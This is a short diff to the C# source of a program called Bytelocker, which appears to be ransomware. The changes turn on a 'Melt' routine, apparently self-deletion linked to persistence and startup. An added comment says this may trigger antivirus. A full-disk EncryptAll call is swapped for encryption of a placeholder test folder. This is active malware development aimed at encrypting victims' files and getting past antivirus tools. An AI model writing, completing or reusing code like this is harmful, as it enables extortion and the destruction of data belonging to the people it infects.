@@ -2,7 +2,7 @@
 using Bytelocker.Installer;
 using Bytelocker.Persistence;
 using Bytelocker.Settings;
-using Bytelocker.src.Tools;
+using Bytelocker.Tools;
 using Bytelocker.UI;
 using System;
 using System.Windows.Forms;
@@ -22,12 +22,13 @@ namespace Bytelocker
             {
                 if (!(args[0] == Melt.NO_MELT_ARG))
                 {
-                    //new Melt();
+                    // melting and adding to startup may trigger av
+                    new Melt();
                 }
             }
             else
             {
-                //new Melt();
+                new Melt();
             }
 
             Encrypt();
@@ -49,7 +50,7 @@ namespace Bytelocker
             if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown")))
             {
                 CryptoManagerMainHandler cmh = new CryptoManagerMainHandler();
-                cmh.EncryptAll();
+                cmh.EncryptFolder(@"TEST_FOLDER_HERE");
             }
         }
 
